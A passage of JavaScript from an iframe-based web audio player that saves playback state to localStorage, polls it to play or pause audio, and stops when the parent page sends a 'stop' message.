        playing: !audio.paused,
        owner: currentState ? currentState.owner : '',
        savedAt: Date.now()
      }));
    } catch (e) {}
  }

  function ensureAudio() {
    if (!audio) {
      audio = new Audio();
      audio.crossOrigin = 'anonymous';
    }
    return audio;
  }

  function playFromState(state) {
    ensureAudio();
    currentState = state;
    if (audio.src !== state.url) {
      audio.src = state.url;
      audio.currentTime = state.time || 0;
    }
    if (state.playing) {
      audio.play().catch(function(e) {
        console.log('[Iframe] Autoplay blocked:', e.message);
      });
    }
  }

  function stopAudio() {
    if (audio) {
      try { audio.pause(); } catch (e) {}
      audio.src = '';
    }
    lastUrl = '';
  }

  // Dengarkan perintah stop dari parent
  window.addEventListener('message', function(e) {
    if (e.data && e.data.type === 'stop') {
      console.log('[Iframe] Stop command received');
      stopAudio();
    }
  });

  // Poll localStorage
  setInterval(function() {
    var state = getState();
    if (!state || !state.url) {
      if (audio && !audio.paused) stopAudio();
      return;
    }
    if (state.url !== lastUrl) {
      lastUrl = state.url;
      playFromState(state);
    } else {
      if (audio && state.playing && audio.paused) audio.play().catch(function(){});
      if (audio && !state.playing && !audio.paused) audio.pause();
    }
  }, 500);

  setInterval(saveState, 1000);
  window.addEventListener('beforeunload', saveState);
})();
